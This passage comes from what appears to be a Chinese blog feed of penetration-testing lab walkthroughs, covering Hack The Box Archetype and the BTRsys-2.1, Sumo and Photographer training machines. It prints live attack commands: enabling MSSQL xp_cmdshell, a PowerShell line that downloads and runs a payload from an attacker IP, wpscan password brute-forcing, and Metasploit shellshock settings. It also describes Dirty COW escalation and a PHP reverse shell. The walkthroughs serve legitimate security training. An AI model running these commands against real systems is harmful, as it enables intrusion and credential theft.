src="/img/Hackthebox-Archetype/image-20240714181735993.png" alt="image-20240714181735993"></p><p>ä¼¼ä¹æ˜¯sql çš„è´¦å·å¯†ç </p><p><img src="/img/Hackthebox-Archetype/image-20240714181819976.png" alt="image-20240714181819976"></p><h2 id="ä¸‰ã€MSSQLä¿¡æ¯æ”¶é›†"><a href="#ä¸‰ã€MSSQLä¿¡æ¯æ”¶é›†" class="headerlink" title="ä¸‰ã€MSSQLä¿¡æ¯æ”¶é›†"></a>ä¸‰ã€MSSQLä¿¡æ¯æ”¶é›†</h2><p>1ã€è¿æ¥mssql</p><p>ä½¿ç”¨impacketåŒ…çš„mssqlå®¢æˆ·ç«¯è„šæœ¬è¿æ¥mssql</p><p><img src="/img/Hackthebox-Archetype/image-20240714182506119.png" alt="image-20240714182506119"></p><p>æŸ¥çœ‹æ•°æ®åº“çš„æƒé™</p><h2 id="å››ã€Getshell"><a href="#å››ã€Getshell" class="headerlink" title="å››ã€Getshell"></a>å››ã€Getshell</h2><p><code>xp_cmdshell</code> å¯ä»¥è®©ç³»ç»Ÿç®¡ç†å‘˜ä»¥æ“ä½œç³»ç»Ÿå‘½ä»¤è¡Œè§£é‡Šå™¨çš„æ–¹å¼æ‰§è¡Œç»™å®šçš„å‘½ä»¤å­—ç¬¦ä¸²ï¼Œæ˜¯ <code>sql servevr</code> çš„åŸç”Ÿå·¥å…·ï¼Œè¯¥æ‰©å±•å­˜å‚¨è¿‡ç¨‹å¯ç”¨äºå‚¬ç”ŸWindowså‘½ä»¤å¤–å£³ï¼›æˆ‘ä»¬éœ€è¦ä¿®æ”¹é…ç½®</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">EXEC sp_configure &#x27;show advanced options&#x27;, 1; </span><br><span class="line">RECONFIGURE;</span><br><span class="line">EXEC sp_configure &#x27;xp_cmdshell&#x27;, 1;</span><br><span class="line">RECONFIGURE;</span><br></pre></td></tr></table></figure><p>ä¹‹åæ‰§è¡Œå‘½ä»¤ï¼Œæ‰§è¡ŒæˆåŠŸ</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">EXEC xp_cmdshell &#x27;net user&#x27;;</span><br></pre></td></tr></table></figure><p><img src="/img/Hackthebox-Archetype/image-20240714184901257.png" alt="image-20240714184901257"></p><p>æˆ‘ä»¬åˆ©ç”¨msf ç”Ÿæˆexe è¿›è¡Œä¸Šä¼ å’Œæ‰§è¡Œ</p><p><img src="/img/Hackthebox-Archetype/image-20240714185333481.png" alt="image-20240714185333481"></p><p>é€šè¿‡mssql ä¸‹è½½åˆ°å¯ä¸‹è½½çš„ç›®å½•</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">EXEC xp_cmdshell &quot;powershell -c cd C:\Users\sql_svc\Downloads;wget http://10.10.16.58:8000/shell.exe -outfile shell.exe&quot;</span><br></pre></td></tr></table></figure><p><img src="/img/Hackthebox-Archetype/image-20240714185637204.png" alt="image-20240714185637204"></p><p>msfè¿›è¡Œç›‘å¬å¹¶æ‰§è¡Œshell.exe</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">xp_cmdshell &quot;powershell -c cd C:\Users\sql_svc\Downloads; .\shell.exe&quot;</span><br></pre></td></tr></table></figure><p><img src="/img/Hackthebox-Archetype/image-20240714190034267.png" alt="image-20240714190034267"></p><p><img src="/img/Hackthebox-Archetype/image-20240714190112459.png" alt="image-20240714190112459"></p><h2 id="äº”ã€æƒé™æå‡"><a href="#äº”ã€æƒé™æå‡" class="headerlink" title="äº”ã€æƒé™æå‡"></a>äº”ã€æƒé™æå‡</h2><p>çœ‹ä¸‹powershell çš„å†å²å‘½ä»¤</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">type C:\Users\sql_svc\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt</span><br></pre></td></tr></table></figure><p><img src="/img/Hackthebox-Archetype/image-20240714192414862.png" alt="image-20240714192414862"></p><p>çœ‹åˆ°admininstrator çš„å¯†ç  <code>MEGACORP_4dm1n!!</code></p><p>ä½¿ç”¨psexec è¿›è¡Œç™»é™†è¿æ¥</p><blockquote><p>PsExec æ˜¯ä¸€ç§è½»å‹ telnet-replacementï¼Œå¯ç”¨äºåœ¨å…¶ä»–ç³»ç»Ÿä¸Šæ‰§è¡Œè¿›ç¨‹ï¼Œæ— éœ€æ‰‹åŠ¨å®‰è£…å®¢æˆ·ç«¯è½¯ä»¶å³å¯å®Œæˆæ§åˆ¶å°åº”ç”¨ç¨‹åºçš„å®Œæ•´äº¤äº’æ€§ã€‚ PsExec æœ€å¼ºå¤§çš„ç”¨é€”åŒ…æ‹¬åœ¨è¿œç¨‹ç³»ç»Ÿå’Œè¿œç¨‹å¯ç”¨å·¥å…·ï¼ˆå¦‚ IpConfigï¼‰ä¸Šå¯åŠ¨äº¤äº’å¼å‘½ä»¤æç¤ºç¬¦ã€‚psexecçš„ä½¿ç”¨ä¸éœ€è¦å¯¹æ–¹ä¸»æœºå¼€æœº3389ç«¯å£ï¼Œåªéœ€è¦å¯¹æ–¹å¼€å¯adminå…±äº«æˆ–c(è¯¥å…±äº«é»˜è®¤å¼€å¯ï¼Œä¾èµ–äº445ç«¯å£)ã€‚ä½†æ˜¯ï¼Œå‡å¦‚ç›®æ ‡ä¸»æœºå¼€å¯äº†é˜²ç«å¢™(å› ä¸ºé˜²ç«å¢™é»˜è®¤ç¦æ­¢445ç«¯å£çš„è¿æ¥)ï¼Œpsexecä¹Ÿæ˜¯ä¸èƒ½ä½¿ç”¨çš„ï¼Œä¼šæç¤ºæ‰¾ä¸åˆ°ç½‘ç»œè·¯å¾„ã€‚ç”±äºpsexecæ˜¯windowsæä¾›çš„å·¥å…·ï¼Œæ‰€ä»¥æ€æ¯’è½¯ä»¶ä¼šå°†å…¶æ·»åŠ åˆ°ç™½åå•ä¸­ã€‚</p></blockquote><p><img src="/img/Hackthebox-Archetype/image-20240714193342548.png" alt="image-20240714193342548"></p>]]></content>
      
      
      <categories>
          
          <category> Hacktheboxç³»åˆ—é¶åœº </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Hackthebox </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ã€OSCPç³»åˆ—ã€‘OSCPé¶æœºâ€”BTRsys-2.1</title>
      <link href="/2024/07/14/OSCP-BTRsys-2-1/"/>
      <url>/2024/07/14/OSCP-BTRsys-2-1/</url>
      
        <content type="html"><![CDATA[<h1 id="OSCPç³»åˆ—é¶æœºâ€”BTRsys-2-1"><a href="#OSCPç³»åˆ—é¶æœºâ€”BTRsys-2-1" class="headerlink" title="OSCPç³»åˆ—é¶æœºâ€”BTRsys-2.1"></a>OSCPç³»åˆ—é¶æœºâ€”BTRsys-2.1</h1><h2 id="ä¸€ã€ä¸»æœºå‘ç°"><a href="#ä¸€ã€ä¸»æœºå‘ç°" class="headerlink" title="ä¸€ã€ä¸»æœºå‘ç°"></a>ä¸€ã€ä¸»æœºå‘ç°</h2><p><img src="/img/OSCP-BTRsys-2-1/image-20240714120227641.png" alt="image-20240714120227641"></p><h2 id="äºŒã€ç«¯å£æ‰«æ"><a href="#äºŒã€ç«¯å£æ‰«æ" class="headerlink" title="äºŒã€ç«¯å£æ‰«æ"></a>äºŒã€ç«¯å£æ‰«æ</h2><p>1ã€å¿«é€Ÿæ‰«æ</p><p><img src="/img/OSCP-BTRsys-2-1/image-20240714120516228.png" alt="image-20240714120516228"></p><p>2ã€å…¨ç«¯å£æ‰«æ</p><p><img src="/img/OSCP-BTRsys-2-1/image-20240714121450552.png" alt="image-20240714121450552"></p><p>3ã€æœåŠ¡ç³»ç»Ÿæ¢æµ‹</p><p><img src="/img/OSCP-BTRsys-2-1/image-20240714121612617.png" alt="image-20240714121612617"></p><p>4ã€æ¼æ´æ¢æµ‹</p><p><img src="/img/OSCP-BTRsys-2-1/image-20240714122713884.png" alt="image-20240714122713884"></p><p>80ç«¯å£æ‰«åˆ°äº†ä¸€äº›ç›®å½•ï¼Œæœ‰wordpressæ¡†æ¶å’Œrobots.txt æ–‡ä»¶ï¼Œä»¥åŠæ˜“å—DOSæ”»å‡»</p><h2 id="ä¸‰ã€ftpä¿¡æ¯æ”¶é›†"><a href="#ä¸‰ã€ftpä¿¡æ¯æ”¶é›†" class="headerlink" title="ä¸‰ã€ftpä¿¡æ¯æ”¶é›†"></a>ä¸‰ã€ftpä¿¡æ¯æ”¶é›†</h2><p><img src="/img/OSCP-BTRsys-2-1/image-20240714123426992.png" alt="image-20240714123426992"></p><p>è¾“å…¥<code>binary</code>è¿›å…¥äºŒè¿›åˆ¶æ¨¡å¼</p><p><img src="/img/OSCP-BTRsys-2-1/image-20240714123541542.png" alt="image-20240714123541542"></p><p>å•¥ä¹Ÿæ²¡æœ‰ï¼Œè‚¯å®šæ²¡è¿™ä¹ˆå®¹æ˜“ï¼›å°è¯•æ–‡ä»¶ä¸Šä¼ </p><p><img src="/img/OSCP-BTRsys-2-1/image-20240714123756178.png" alt="image-20240714123756178"></p><p>ä¹Ÿå¤±è´¥äº†ï¼Œæš‚æ—¶æ”¶é›†åˆ°è¿™é‡Œ</p><h2 id="å››ã€HTTPä¿¡æ¯æ”¶é›†"><a href="#å››ã€HTTPä¿¡æ¯æ”¶é›†" class="headerlink" title="å››ã€HTTPä¿¡æ¯æ”¶é›†"></a>å››ã€HTTPä¿¡æ¯æ”¶é›†</h2><p>1ã€é¦–é¡µ</p><p><img src="/img/OSCP-BTRsys-2-1/image-20240714123918510.png" alt="image-20240714123918510"></p><p><img src="/img/OSCP-BTRsys-2-1/image-20240714123931298.png" alt="image-20240714123931298"></p><p>2ã€ç›®å½•æ‰«æ</p><p><img src="/img/OSCP-BTRsys-2-1/image-20240714124456779.png" alt="image-20240714124456779"></p><p>3ã€wordpressä¿¡æ¯æ”¶é›†</p><p><img src="/img/OSCP-BTRsys-2-1/image-20240714124600748.png" alt="image-20240714124600748"></p><p>4ã€wpscan æ‰«æç”¨æˆ·å</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wpscan --url http://192.168.31.69/wordpress/ --enumerate u </span><br></pre></td></tr></table></figure><p><img src="/img/OSCP-BTRsys-2-1/image-20240714124943626.png" alt="image-20240714124943626"></p><p>æœ‰<code>btrisk</code>å’Œ<code>admin</code>ä¸¤ä¸ªç”¨æˆ·ï¼›<code>cewl </code>æ”¶é›†å¯†ç ä¿¡æ¯</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cewl http://192.168.31.69/wordpress/ -w pass.txt </span><br></pre></td></tr></table></figure><p>5ã€å¯¹æ”¶é›†çš„ç”¨æˆ·åè¿›è¡Œçˆ†ç ´</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wpscan --url &quot;http://192.168.31.69/wordpress/&quot; -P &quot;pass.txt&quot; --usernames user.txt</span><br></pre></td></tr></table></figure><p><img src="/img/OSCP-BTRsys-2-1/image-20240714125458846.png" alt="image-20240714125458846"></p><p>æ²¡æœ‰å‘ç°å¯†ç ï¼Œä½¿ç”¨å…¶ä»–çš„å­—å…¸è¿›è¡Œçˆ†ç ´</p><p><img src="/img/OSCP-BTRsys-2-1/image-20240714125935168.png" alt="image-20240714125935168"></p><p>æ‰¾åˆ°admin çš„å¯†ç admin</p><p><img src="/img/OSCP-BTRsys-2-1/image-20240714130018947.png" alt="image-20240714130018947"></p><p>ç™»é™†æˆåŠŸ</p><h2 id="äº”ã€Getshell"><a href="#äº”ã€Getshell" class="headerlink" title="äº”ã€Getshell"></a>äº”ã€Getshell</h2><p>åœ¨åå°å¯¹wordpress çš„ä¸»é¢˜è¿›è¡Œç¼–è¾‘</p><p><img src="/img/OSCP-BTRsys-2-1/image-20240714132617563.png" alt="image-20240714132617563"></p><p><img src="/img/OSCP-BTRsys-2-1/image-20240714132623180.png" alt="image-20240714132623180"></p><p>æ”¹æˆphpåå¼¹shellä»£ç è¿›è¡Œç›‘å¬</p><p><img src="/img/OSCP-BTRsys-2-1/image-20240714132800786.png" alt="image-20240714132800786"></p><p>è·å–shell</p><h2 id="å…­ã€æƒé™æå‡"><a href="#å…­ã€æƒé™æå‡" class="headerlink" title="å…­ã€æƒé™æå‡"></a>å…­ã€æƒé™æå‡</h2><h3 id="1ã€ææƒåˆ°btrisk"><a href="#1ã€ææƒåˆ°btrisk" class="headerlink" title="1ã€ææƒåˆ°btrisk"></a>1ã€ææƒåˆ°btrisk</h3><p>1ã€ä¿¡æ¯æ”¶é›†</p><p>æŸ¥çœ‹å†å²å‘½ä»¤çš„æ—¶å€™å‘ç°äº†æ•°æ®åº“root çš„å¯†ç </p><p><img src="/img/OSCP-BTRsys-2-1/image-20240714134159018.png" alt="image-20240714134159018"></p><p>2ã€æ•°æ®åº“æŸ¥çœ‹</p><p><img src="/img/OSCP-BTRsys-2-1/image-20240714134324611.png" alt="image-20240714134324611"></p><p>å¯¹<code>wordpress</code>æ•°æ®åº“è¿›è¡ŒæŸ¥çœ‹</p><p><img src="/img/OSCP-BTRsys-2-1/image-20240714134534395.png" alt="image-20240714134534395"></p><p>è¿™ä¸ª<code>btrisk</code>è·Ÿé¶æœºä¸­æ™®é€šç”¨æˆ·çš„åå­—ä¸€æ ·ï¼Œå¯†ç è¿›è¡Œmd5è§£å¯†</p><p><img src="/img/OSCP-BTRsys-2-1/image-20240714134656488.png" alt="image-20240714134656488"></p><p>sshè¿æ¥ï¼Œææƒåˆ°<code>btrisk</code></p><p><img src="/img/OSCP-BTRsys-2-1/image-20240714134810020.png" alt="image-20240714134810020"></p><h3 id="2ã€ææƒåˆ°root"><a href="#2ã€ææƒåˆ°root" class="headerlink" title="2ã€ææƒåˆ°root"></a>2ã€ææƒåˆ°root</h3><p>sudoæ»¥ç”¨ææƒ</p><p><img src="/img/OSCP-BTRsys-2-1/image-20240714135143513.png" alt="image-20240714135143513"></p>]]></content>
      
      
      <categories>
          
          <category> OSCPç³»åˆ—é¶åœº </category>
          
      </categories>
      
      
        <tags>
            
            <tag> oscp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ã€OSCPç³»åˆ—ã€‘OSCPé¶æœºâ€”Sumo</title>
      <link href="/2024/07/13/OSCP-Sumo/"/>
      <url>/2024/07/13/OSCP-Sumo/</url>
      
        <content type="html"><![CDATA[<h1 id="ã€OSCPç³»åˆ—ã€‘OSCPé¶æœºâ€”Sumo"><a href="#ã€OSCPç³»åˆ—ã€‘OSCPé¶æœºâ€”Sumo" class="headerlink" title="ã€OSCPç³»åˆ—ã€‘OSCPé¶æœºâ€”Sumo"></a>ã€OSCPç³»åˆ—ã€‘OSCPé¶æœºâ€”Sumo</h1><h2 id="ä¸€ã€ä¸»æœºå‘ç°"><a href="#ä¸€ã€ä¸»æœºå‘ç°" class="headerlink" title="ä¸€ã€ä¸»æœºå‘ç°"></a>ä¸€ã€ä¸»æœºå‘ç°</h2><p><img src="/img/OSCP-Sumo/image-20240713200918079.png" alt="image-20240713200918079"></p><h2 id="äºŒã€ç«¯å£æ‰«æ"><a href="#äºŒã€ç«¯å£æ‰«æ" class="headerlink" title="äºŒã€ç«¯å£æ‰«æ"></a>äºŒã€ç«¯å£æ‰«æ</h2><p>1ã€å¿«é€Ÿæ‰«æ</p><p><img src="/img/OSCP-Sumo/image-20240713201007493.png" alt="image-20240713201007493"></p><p>2ã€å…¨ç«¯å£æ‰«æ</p><p><img src="/img/OSCP-Sumo/image-20240713201102130.png" alt="image-20240713201102130"></p><p>3ã€å¼€æ”¾ç«¯å£çš„æœåŠ¡ä¿¡æ¯</p><p><img src="/img/OSCP-Sumo/image-20240713201256990.png" alt="image-20240713201256990"></p><p>4ã€å¼€æ”¾ç«¯å£çš„æ¼æ´ä¿¡æ¯</p><p><img src="/img/OSCP-Sumo/image-20240713201755990.png" alt="image-20240713201755990"></p><p>80ç«¯å£å—dosæ”»å‡»å½±å“</p><h2 id="ä¸‰ã€HTTPä¿¡æ¯æ”¶é›†"><a href="#ä¸‰ã€HTTPä¿¡æ¯æ”¶é›†" class="headerlink" title="ä¸‰ã€HTTPä¿¡æ¯æ”¶é›†"></a>ä¸‰ã€HTTPä¿¡æ¯æ”¶é›†</h2><p>1ã€æºä»£ç æŸ¥çœ‹</p><p><img src="/img/OSCP-Sumo/image-20240713201721364.png" alt="image-20240713201721364"></p><p><img src="/img/OSCP-Sumo/image-20240713201740102.png" alt="image-20240713201740102"></p><p>æ²¡å•¥ä¿¡æ¯</p><p>2ã€ç›®å½•æ‰«æ</p><p><img src="/img/OSCP-Sumo/image-20240713201656130.png" alt="image-20240713201656130"></p><p>æ²¡ç»“æœï¼Œå‡†å¤‡ä¸ªå¤§å­—å…¸</p><p><img src="/img/OSCP-Sumo/image-20240713202824335.png" alt="image-20240713202824335"></p><p><img src="/img/OSCP-Sumo/image-20240713203549284.png" alt="image-20240713203549284"></p><p>å¤§å­—å…¸è·‘å®Œäº†ä¾ç„¶æ²¡ç»“æœ</p><p>3ã€ä½¿ç”¨æ¼æ´æ¢æµ‹å™¨</p><p>ä½¿ç”¨è½»å·§å‹æ‰«æå™¨ nikto è¿›è¡Œæ‰«æï¼Œå‘ç°shellshock æ¼æ´</p><p><img src="/img/OSCP-Sumo/image-20240713203714112.png" alt="image-20240713203714112"></p><p>çœ‹ä¸‹è§£é‡Š</p><p><img src="/img/OSCP-Sumo/image-20240713203841473.png" alt="image-20240713203841473"></p><h2 id="å››ã€Getshell"><a href="#å››ã€Getshell" class="headerlink" title="å››ã€Getshell"></a>å››ã€Getshell</h2><p>æŸ¥æ‰¾æœ‰å…³è¯¥æ¼æ´çš„åˆ©ç”¨</p><p><img src="/img/OSCP-Sumo/image-20240713203945197.png" alt="image-20240713203945197"></p><p>æœ‰å¾ˆå¤šmsf å†…ç½®çš„åˆ©ç”¨æ–¹å¼ï¼Œå»msfæŸ¥æ‰¾</p><p><img src="/img/OSCP-Sumo/image-20240713204214469.png" alt="image-20240713204214469"></p><p>ç¡®å®æœ‰å¾ˆå¤šï¼›åœ¨ç«¯å£æ‰«æä¸­ï¼Œå‘ç°80ç«¯å£æ˜¯apacheæœåŠ¡ï¼Œå› æ­¤é€‰æ‹©ç¼–å·ä¸º1 çš„ï¼Œæ›´è´´åˆ‡apache</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">set rhosts 192.168.31.68</span><br><span class="line">set TARGETURI /cgi-bin/test.sh</span><br></pre></td></tr></table></figure><blockquote><p>è¿™é‡Œrhosts æ˜¯é¶æœºipï¼ŒTARGETURI æ˜¯nikto è¯†åˆ«å‡ºæ¥çš„è·¯å¾„</p><p>lhostã€lport å¯ä»¥ä¸ç”¨åŠ¨ï¼Œé»˜è®¤æ˜¯æœ¬æœºIPè·Ÿç«¯å£ï¼Œå¦‚æœä¸æ˜¯éœ€è¦ä¿®æ”¹</p></blockquote><p><img src="/img/OSCP-Sumo/image-20240713205310315.png" alt="image-20240713205310315"></p><p>æˆåŠŸè·å–shell</p><h2 id="äº”ã€æƒé™æå‡"><a href="#äº”ã€æƒé™æå‡" class="headerlink" title="äº”ã€æƒé™æå‡"></a>äº”ã€æƒé™æå‡</h2><p>1ã€ç”¨æˆ·ä¿¡æ¯æ”¶é›†</p><p><img src="/img/OSCP-Sumo/image-20240713205441368.png" alt="image-20240713205441368"></p><p>åªæœ‰ä¸€ä¸ª<code>sumo</code>ç”¨æˆ·</p><p><img src="/img/OSCP-Sumo/image-20240713210829250.png" alt="image-20240713210829250"></p><p>å•¥ä¹Ÿç±³æœ‰</p><p>2ã€é«˜æƒé™æ–‡ä»¶</p><p><img src="/img/OSCP-Sumo/image-20240713211017228.png" alt="image-20240713211017228"></p><p>å•¥ä¹Ÿæ²¡æœ‰</p><p>3ã€è„ç‰›ææƒ</p><p>æŸ¥çœ‹å†…æ ¸ç‰ˆæœ¬ï¼Œç‰ˆæœ¬è¾ƒä½ï¼Œå°è¯•è„ç‰›ææƒ</p><p><img src="/img/OSCP-Sumo/image-20240713211408827.png" alt="image-20240713211408827"></p><p>æŸ¥æ‰¾ææƒè„šæœ¬</p><p><img src="/img/OSCP-Sumo/image-20240713212145891.png" alt="image-20240713212145891"></p><p>å¯¹è¯¥cppæ–‡ä»¶åœ¨æœ¬åœ°è¿›è¡Œç¼–è¯‘</p><p><img src="/img/OSCP-Sumo/image-20240713212454223.png" alt="image-20240713212454223"></p><p>é€šè¿‡pythonå¼€å¯çš„httpæœåŠ¡ï¼Œä¸Šä¼ åˆ°é¶æœº</p><p><img src="/img/OSCP-Sumo/image-20240713212531447.png" alt="image-20240713212531447"></p><p>ä¹‹åæ·»åŠ æ‰§è¡Œæƒé™å¹¶æ‰§è¡Œ</p><p><img src="/img/OSCP-Sumo/image-20240713212717174.png" alt="image-20240713212717174"></p><p>ææƒå¤±è´¥</p><p>4ã€è„ç‰›ææƒå…¶ä»–å§¿åŠ¿</p><p><img src="/img/OSCP-Sumo/image-20240713212805575.png" alt="image-20240713212805575"></p><p>æŸ¥çœ‹ç¼–è¯‘è¯­å¥</p><p><img src="/img/OSCP-Sumo/image-20240713212958765.png" alt="image-20240713212958765"></p><p>ä¸Šä¼ åˆ°é¶æœºè¿›è¡Œç¼–è¯‘æ‰§è¡Œ</p><p><img src="/img/OSCP-Sumo/image-20240713214237675.png" alt="image-20240713214237675"></p><p>ç”¨sshè¿æ¥ææƒåˆ°root</p><p><img src="/img/OSCP-Sumo/image-20240713214351227.png" alt="image-20240713214351227"></p>]]></content>
      
      
      <categories>
          
          <category> OSCPç³»åˆ—é¶åœº </category>
          
      </categories>
      
      
        <tags>
            
            <tag> oscp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ã€OSCPç³»åˆ—ã€‘OSCPé¶æœºâ€”Photographer</title>
      <link href="/2024/07/01/OSCP-Photographer/"/>
      <url>/2024/07/01/OSCP-Photographer/</url>
      
        <content type="html"><![CDATA[<h1 id="ã€OSCPç³»åˆ—ã€‘OSCPé¶æœºâ€”Photographer"><a href="#ã€OSCPç³»åˆ—ã€‘OSCPé¶æœºâ€”Photographer" class="headerlink" title="ã€OSCPç³»åˆ—ã€‘OSCPé¶æœºâ€”Photographer"></a>ã€OSCPç³»åˆ—ã€‘OSCPé¶æœºâ€”Photographer</h1><h2 id="ä¸€ã€ä¸»æœºå‘ç°"><a href="#ä¸€ã€ä¸»æœºå‘ç°" class="headerlink" title="ä¸€ã€ä¸»æœºå‘ç°"></a>ä¸€ã€ä¸»æœºå‘ç°</h2><p><img src="/img/OSCP-Photographer/image-20240630231520178.png" alt="image-20240630231520178"></p><h2 id="äºŒã€ç«¯å£å‘ç°"><a href="#äºŒã€ç«¯å£å‘ç°" class="headerlink" title="äºŒã€ç«¯å£å‘ç°"></a>äºŒã€ç«¯å£å‘ç°</h2><h3 id="1ã€å¿«é€Ÿæ‰«æ"><a href="#1ã€å¿«é€Ÿæ‰«æ" class="headerlink" title="1ã€å¿«é€Ÿæ‰«æ"></a>1ã€å¿«é€Ÿæ‰«æ</h3><p><img src="/img/OSCP-Photographer/image-20240630231559152.png" alt="image-20240630231559152"></p><h3 id="2ã€å…¨ç«¯å£æ‰«æ"><a href="#2ã€å…¨ç«¯å£æ‰«æ" class="headerlink" title="2ã€å…¨ç«¯å£æ‰«æ"></a>2ã€å…¨ç«¯å£æ‰«æ</h3><p><img src="/img/OSCP-Photographer/image-20240630231658308.png" alt="image-20240630231658308"></p><p><img src="/img/OSCP-Photographer/image-20240630231833186.png" alt="image-20240630231833186"></p><h3 id="3ã€æœåŠ¡ç‰ˆæœ¬æ¢æµ‹"><a href="#3ã€æœåŠ¡ç‰ˆæœ¬æ¢æµ‹" class="headerlink" title="3ã€æœåŠ¡ç‰ˆæœ¬æ¢æµ‹"></a>3ã€æœåŠ¡ç‰ˆæœ¬æ¢æµ‹</h3><p><img src="/img/OSCP-Photographer/image-20240630232036370.png" alt="image-20240630232036370"></p><p>80æ˜¯HTTPæœåŠ¡ï¼Œ139ã€445æ˜¯SambaæœåŠ¡ï¼Œ8000ä¹Ÿæ˜¯ä¸€ä¸ªHTTPæœåŠ¡ï¼Œæ¨æµ‹æœåŠ¡å™¨æ˜¯Linux</p><h3 id="4ã€ç«¯å£æ¼æ´æ¢æµ‹"><a href="#4ã€ç«¯å£æ¼æ´æ¢æµ‹" class="headerlink" title="4ã€ç«¯å£æ¼æ´æ¢æµ‹"></a>4ã€ç«¯å£æ¼æ´æ¢æµ‹</h3><p><img src="/img/OSCP-Photographer/image-20240630232750568.png" alt="image-20240630232750568"></p><p><img src="/img/OSCP-Photographer/image-20240630233029884.png" alt="image-20240630233029884"></p><p><img src="/img/OSCP-Photographer/image-20240630233128877.png" alt="image-20240630233128877"></p><p>80ç«¯å£å‘ç°äº†ä¸€ä¸ªå¯èƒ½çš„SQLæ¼æ´ï¼Œè¿˜æœ‰ä¸€ä¸ªcsrfæ¼æ´ï¼›8000ç«¯å£å‘ç°äº†å‡ ä¸ªç›®å½•ï¼›é’ˆå¯¹windows 2000æœ‰ä¸€ä¸ªsmbçš„æ‹’ç»æœåŠ¡æ”»å‡»</p><h2 id="ä¸‰ã€HTTPä¿¡æ¯æ”¶é›†"><a href="#ä¸‰ã€HTTPä¿¡æ¯æ”¶é›†" class="headerlink" title="ä¸‰ã€HTTPä¿¡æ¯æ”¶é›†"></a>ä¸‰ã€HTTPä¿¡æ¯æ”¶é›†</h2><h3 id="1ã€80ç«¯å£ä¿¡æ¯æ”¶é›†"><a href="#1ã€80ç«¯å£ä¿¡æ¯æ”¶é›†" class="headerlink" title="1ã€80ç«¯å£ä¿¡æ¯æ”¶é›†"></a>1ã€80ç«¯å£ä¿¡æ¯æ”¶é›†</h3><p>è™½ç„¶nmapåœ¨è¿™ä¸ªç«¯å£å‘ç°äº†ä¸€ä¸ªsqlæ¼æ´ï¼Œä½†æ˜¯çœ‹é‚£ä¸ªé“¾æ¥éƒ½æ„Ÿè§‰ä¸å¤ªè¡Œã€‚è¿˜æ˜¯æ­£ç´§æ¥å§ï¼Œçœ‹é¦–é¡µ</p><p><img src="/img/OSCP-Photographer/image-20240630233635378.png" alt="image-20240630233635378"></p><p>ç®€å•çœ‹äº†ä¸€ä¸‹ï¼Œéƒ½æ˜¯é™æ€é¡µé¢ï¼Œå…ˆè½¬å‘8000ç«¯å£</p><h3 id="2ã€8000ç«¯å£ä¿¡æ¯æ”¶é›†"><a href="#2ã€8000ç«¯å£ä¿¡æ¯æ”¶é›†" class="headerlink" title="2ã€8000ç«¯å£ä¿¡æ¯æ”¶é›†"></a>2ã€8000ç«¯å£ä¿¡æ¯æ”¶é›†</h3><p>è¿™ä¸ªé¡µé¢æœ‰å¤§å¤§çš„é—®é¢˜å•Š</p><p><img src="/img/OSCP-Photographer/image-20240701002335801.png" alt="image-20240701002335801"></p><p>ç‚¹é‚£ä¸ª<code>Download File</code>ï¼Œå±…ç„¶æ˜¾ç¤ºäº†ä¸‹é¢<code>shell.php</code>æ–‡ä»¶çš„æŠ¥é”™ä¿¡æ¯</p><p><img src="/img/OSCP-Photographer/image-20240701004701807.png" alt="image-20240701004701807"></p><p>ç–‘ä¼¼æŸç§è¿æ¥æœªè¿æ¥ä¸Šï¼Œæœç´¢è¿™ä¸ªç½‘ç«™çš„cmsæ¼æ´ä¿¡æ¯</p><p><img src="/img/OSCP-Photographer/image-20240701004955250.png" alt="image-20240701004955250"></p><p>å­˜åœ¨ä»»æ„æ–‡ä»¶ä¸Šä¼ ï¼›åœ¨è¿™ä¸ªè„šæœ¬ä¸­ä¹Ÿæ˜¯ç»™äº†æ“ä½œçš„æ­¥éª¤</p><p><img src="/img/OSCP-Photographer/image-20240701005144564.png" alt="image-20240701005144564"></p><p>åœ¨ç¬¬3æ­¥ä¸­è¿›è¡Œä¸Šä¼ ï¼Œåœ¨ç»™å®šçš„é¡µé¢ä¸­æ²¡æœ‰æ‰¾åˆ°ä¸Šä¼ ç‚¹ï¼Œåªå¥½ç›®å½•çˆ†ç ´</p><p><img src="/img/OSCP-Photographer/image-20240701005632604.png" alt="image-20240701005632604"></p><p>å­˜åœ¨<code>/admin</code>ç›®å½•ï¼Œæ˜¯æˆ‘ä»¬æ²¡æœ‰æœç´¢çš„</p><p><img src="/img/OSCP-Photographer/image-20240701005852241.png" alt="image-20240701005852241"></p><p>æ˜¯ä¸€ä¸ªåå°ç™»é™†é¡µï¼Œè¿™é‡Œä¹Ÿæ˜¯ä¸€ç›´æ²¡æœ‰ç™»é™†ä¸Šï¼Œå…ˆæš‚æ—¶æ”¾å¼ƒè¿™é‡Œ</p><h2 id="å››ã€SMBä¿¡æ¯æ”¶é›†"><a href="#å››ã€SMBä¿¡æ¯æ”¶é›†" class="headerlink" title="å››ã€SMBä¿¡æ¯æ”¶é›†"></a>å››ã€SMBä¿¡æ¯æ”¶é›†</h2><p>ä¹‹åæˆ‘ä»¬å°†é‡ç‚¹æ”¾åœ¨å‰©ä¸‹çš„smbæœåŠ¡ä¸Š</p><p><img src="/img/OSCP-Photographer/image-20240701010534865.png" alt="image-20240701010534865"></p><p>è¿æ¥<code>sambashre</code></p><p><img 